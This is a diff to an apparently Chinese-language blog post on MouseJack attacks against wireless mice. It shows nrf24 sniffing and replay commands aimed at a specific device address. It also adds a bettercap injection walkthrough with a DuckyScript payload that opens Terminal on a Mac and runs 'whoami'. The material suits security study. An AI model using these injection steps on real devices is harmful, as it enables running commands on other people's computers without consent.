@@ -21,6 +21,8 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 <p>  对特定地址进行嗅探<br>  capture.log 为固定输出文件名 </p>
 <p>  sudo ./nrf24-sniffer.py -a 0D:6C:90:B4:A4 -o capture.log<br>  sudo ./nrf24-static-channel-replay -a 0D:6C:90:B4:A4</p>
 <p>  即可重放log里的数据</p>
+<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
+<p><img src="/images/mouse/b2.png" alt="调用termnial"></p>
 ]]></content>
       <categories>
         <category>IOT</category>
